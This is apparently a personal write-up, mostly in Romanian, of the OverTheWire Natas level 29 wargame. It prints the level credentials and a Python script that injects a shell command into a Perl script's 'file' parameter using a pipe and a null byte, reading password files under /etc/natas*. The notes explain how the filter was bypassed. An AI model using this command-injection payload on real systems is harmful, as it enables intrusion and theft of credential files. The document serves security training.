
# General info

Username: natas29

Password: 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns

URL:      http://natas29.natas.labs.overthewire.org

# Special code section

```py
import requests


response = requests.get(
    url="http://natas29.natas.labs.overthewire.org/index.pl",
    auth=("natas29", "31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns"),
    params={
        "file" : "|find /etc/nata* -exec sh -c 'echo && printf $1 && printf \" \" && cat $1 && echo' _ {} \;\x00"
    }
)

print(response.text)
```

Initial am incercat sa aflu daca tine de `perl`, uitandu-ma la:
- cookies
- status codes
- query params (ca in level 28)

Am incercat sa caut si prin textele de pe pagina dupa `password`, in cazul in care ar fi ceva de interes.

Solutia a venit cand m-am uitat pe un writeup care spune de _"file traversal"_.
Nu am inteles de ce a mers `|<command>\x00`, pentru ca am incercat inainte:
- `"file" : "index.pl"`
- `"file" : "index.html"`
sau altele, dar nu a mers nimic din ele.

Dupa, cand am vazut ca merge folosind `|<command>\x00` (am inteles ca acel NULL byte e necesar deoarece, cand executia ajunge la nivel de C, string-ul este "taiat"), am observat ca nu puteai avea `natas` in comanda.
Asa ca am folosind o combinatie de `find` (cu care am iterat tot directorul `/etc/natas_webpass`) si am citit ce am putut de acolo.
Am gasit doua parole: cea de la `natas29` si cea de la `natas30`.